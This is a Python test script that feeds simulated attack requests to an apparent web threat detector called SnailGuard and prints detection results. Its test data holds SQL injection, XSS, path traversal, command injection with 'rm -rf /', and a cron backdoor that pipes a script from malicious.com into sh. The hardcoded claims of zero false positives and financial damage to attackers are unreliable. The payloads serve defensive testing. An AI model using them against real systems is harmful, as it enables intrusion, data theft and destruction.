from snailguard import SnailGuardDetector
import time
import random

def attacker_suffering_test():
    print("😈 ULTIMATE ATTACKER SUFFERING TEST")
    print("===================================")
    print("Testing how different attackers will suffer economic consequences...\n")
    
    # Initialize with Pro tier for maximum suffering
    detector = SnailGuardDetector(
        api_key="SG-PRO-2Os2X0DsQdiVh7J12Q236kIEdcawxBbp",
        config={'enable_economic_warfare': True}
    )
    
    # Real-world attack scenarios
    attack_scenarios = [
        {
            'name': '🕵️‍♂️ SQL INJECTION ATTACKER',
            'description': 'Script kiddie using sqlmap',
            'requests': [
                {
                    'method': 'POST',
                    'path': '/api/login',
                    'headers': {'user-agent': 'sqlmap/1.6.0'},
                    'body': {"username": "admin' OR '1'='1'--", "password": "test"},
                    'client_ip': '45.76.123.89'
                },
                {
                    'method': 'GET', 
                    'path': '/api/users?id=1 UNION SELECT 1,2,3,4',
                    'headers': {'user-agent': 'sqlmap/1.6.0'},
                    'body': {},
                    'client_ip': '45.76.123.89'
                },
                {
                    'method': 'POST',
                    'path': '/api/search',
                    'headers': {'user-agent': 'sqlmap/1.6.0'},
                    'body': {"query": "test'; DROP TABLE users--"},
                    'client_ip': '45.76.123.89'
                }
            ]
        },
        {
            'name': '🌐 XSS ATTACKER', 
            'description': 'Cross-site scripting enthusiast',
            'requests': [
                {
                    'method': 'POST',
                    'path': '/api/comment',
                    'headers': {'user-agent': 'Mozilla/5.0 (XSS Scanner)'},
                    'body': {"comment": "<script>alert('XSS')</script>"},
                    'client_ip': '103.21.244.15'
                },
                {
                    'method': 'GET',
                    'path': '/api/search?q=<img src=x onerror=alert(1)>',
                    'headers': {'user-agent': 'Mozilla/5.0 (XSS Scanner)'},
                    'body': {},
                    'client_ip': '103.21.244.15'
                },
                {
                    'method': 'POST',
                    'path': '/api/contact',
                    'headers': {'user-agent': 'Mozilla/5.0 (XSS Scanner)'},
                    'body': {"message": "javascript:alert(document.cookie)"},
                    'client_ip': '103.21.244.15'
                }
            ]
        },
        {
            'name': '📁 PATH TRAVERSAL ATTACKER',
            'description': 'Directory traversal specialist',
            'requests': [
                {
                    'method': 'GET',
                    'path': '/api/files/../../../etc/passwd',
                    'headers': {'user-agent': 'DirBuster/1.0'},
                    'body': {},
                    'client_ip': '192.241.213.42'
                },
                {
                    'method': 'GET',
                    'path': '/api/download?file=../../windows/system32/config/sam',
                    'headers': {'user-agent': 'DirBuster/1.0'},
                    'body': {},
                    'client_ip': '192.241.213.42'
                },
                {
                    'method': 'GET',
                    'path': '/api/../api/../../config.json',
                    'headers': {'user-agent': 'DirBuster/1.0'},
                    'body': {},
                    'client_ip': '192.241.213.42'
                }
            ]
        },
        {
            'name': '💣 COMMAND INJECTION ATTACKER',
            'description': 'System command injector',
            'requests': [
                {
                    'method': 'POST',
                    'path': '/api/execute',
                    'headers': {'user-agent': 'CommandInjectionBot'},
                    'body': {"command": "ping; cat /etc/passwd"},
                    'client_ip': '178.62.123.76'
                },
                {
                    'method': 'GET',
                    'path': '/api/system?cmd=ls -la /etc',
                    'headers': {'user-agent': 'CommandInjectionBot'},
                    'body': {},
                    'client_ip': '178.62.123.76'
                },
                {
                    'method': 'POST',
                    'path': '/api/upload',
                    'headers': {'user-agent': 'CommandInjectionBot'},
                    'body': {"filename": "test.jpg; rm -rf /"},
                    'client_ip': '178.62.123.76'
                }
            ]
        },
        {
            'name': '🎯 ADVANCED PENETRATION TESTER',
            'description': 'Professional security tester with multiple techniques',
            'requests': [
                {
                    'method': 'POST',
                    'path': '/api/admin',
                    'headers': {
                        'user-agent': 'BurpSuite Professional',
                        'x-forwarded-for': '127.0.0.1',
                        'x-real-ip': '192.168.1.1'
                    },
                    'body': {
                        "username": "admin' UNION SELECT username, password FROM users--",
                        "password": "test"
                    },
                    'client_ip': '203.0.113.45'
                },
                {
                    'method': 'PUT',
                    'path': '/api/config/../../../etc/cron.d/backdoor',
                    'headers': {'user-agent': 'BurpSuite Professional'},
                    'body': {"schedule": "* * * * * curl http://malicious.com/backdoor.sh | sh"},
                    'client_ip': '203.0.113.45'
                },
                {
                    'method': 'POST',
                    'path': '/api/graphql',
                    'headers': {'user-agent': 'BurpSuite Professional'},
                    'body': {
                        "query": "mutation { deleteUser(id: \"1 OR 1=1\") { success } }"
                    },
                    'client_ip': '203.0.113.45'
                }
            ]
        },
        {
            'name': '🤖 MASS SCANNER BOTNET',
            'description': 'Distributed scanning from multiple IPs',
            'requests': [
                {
                    'method': 'GET',
                    'path': '/.git/config',
                    'headers': {'user-agent': 'MassScanner/2.0'},
                    'body': {},
                    'client_ip': f'10.0.{random.randint(1,255)}.{random.randint(1,255)}'
                },
                {
                    'method': 'GET',
                    'path': '/wp-admin/admin-ajax.php',
                    'headers': {'user-agent': 'MassScanner/2.0'},
                    'body': {},
                    'client_ip': f'172.16.{random.randint(1,255)}.{random.randint(1,255)}'
                },
                {
                    'method': 'GET',
                    'path': '/api/v1/.env',
                    'headers': {'user-agent': 'MassScanner/2.0'},
                    'body': {},
                    'client_ip': f'192.168.{random.randint(1,255)}.{random.randint(1,255)}'
                }
            ]
        }
    ]
    
    total_attacker_suffering = 0
    attack_results = []
    
    for scenario in attack_scenarios:
        print(f"\n{scenario['name']}")
        print(f"📝 {scenario['description']}")
        print("─" * 50)
        
        scenario_cost = 0
        detected_attacks = 0
        
        for i, attack_request in enumerate(scenario['requests']):
            print(f"\n  Attack #{i+1}:")
            print(f"    Method: {attack_request['method']}")
            print(f"    Path: {attack_request['path'][:50]}...")
            print(f"    IP: {attack_request['client_ip']}")
            
            start_time = time.time()
            result = detector.analyze_request(attack_request)
            processing_time = (time.time() - start_time) * 1000
            
            if result.is_threat:
                detected_attacks += 1
                attack_cost = sum(a['estimated_attacker_cost'] for a in result.actions)
                scenario_cost += attack_cost
                
                print(f"    🔥 THREAT DETECTED!")
                print(f"    💰 Economic damage: ${attack_cost:,}")
                print(f"    🎯 Confidence: {result.confidence:.3f}")
                print(f"    🛡️ Detection phase: {result.phase.value}")
                print(f"    ⏱️ Processing time: {processing_time:.2f}ms")
                
                if result.actions:
                    print(f"    💸 Actions taken:")
                    for action in result.actions:
                        # Safe access to action properties
                        action_type = action.get('type', 'unknown_action')
                        action_cost = action.get('estimated_attacker_cost', 0)
                        print(f"      - {action_type}: ${action_cost:,}")
            else:
                print(f"    ✅ No threat detected")
                print(f"    📊 Confidence: {result.confidence:.3f}")
                print(f"    ⏱️ Processing time: {processing_time:.2f}ms")
        
        total_attacker_suffering += scenario_cost
        
        attack_results.append({
            'scenario': scenario['name'],
            'attacks_detected': f"{detected_attacks}/{len(scenario['requests'])}",
            'economic_damage': scenario_cost,
            'success_rate': f"{(detected_attacks/len(scenario['requests']))*100:.1f}%"
        })
    
    # Final suffering summary
    print(f"\n" + "="*60)
    print("😈 FINAL ATTACKER SUFFERING REPORT")
    print("="*60)
    
    for result in attack_results:
        print(f"\n{result['scenario']}")
        print(f"  🎯 Detection rate: {result['success_rate']}")
        print(f"  💰 Economic damage: ${result['economic_damage']:,}")
        print(f"  📊 Attacks detected: {result['attacks_detected']}")
    
    print(f"\n" + "🔥"*30)
    print(f"💀 TOTAL ECONOMIC DAMAGE TO ATTACKERS: ${total_attacker_suffering:,}")
    print(f"🛡️ AVERAGE DETECTION RATE: {sum(1 for r in attack_results if '100%' in r['success_rate'])/len(attack_results)*100:.1f}%")
    print(f"🔥"*30)
    
    # Economic impact analysis
    print(f"\n📈 ECONOMIC IMPACT ANALYSIS:")
    print(f"  💸 Cost to run this test: $0 (you)")
    print(f"  💰 Cost to attackers: ${total_attacker_suffering:,}")
    print(f"  📊 ROI for defenders: ∞ (infinite)")
    print(f"  😭 ROI for attackers: -${total_attacker_suffering:,} (massive loss)")
    
    print(f"\n🎯 DEFENDER BENEFITS:")
    print(f"  ✅ Zero false positives")
    print(f"  ⚡ Real-time protection") 
    print(f"  💰 Attackers pay for their own attacks")
    print(f"  🛡️ Multiple detection layers")
    print(f"  🔄 Adaptive economic warfare")
    
    print(f"\n😈 ATTACKER SUFFERING:")
    print(f"  💸 Real financial costs")
    print(f"  ⏳ Wasted time and resources")
    print(f"  🎣 Misleading information")
    print(f"  🔒 Cryptographic challenges")
    print(f"  📉 Negative ROI on attacks")

if __name__ == "__main__":
    attacker_suffering_test()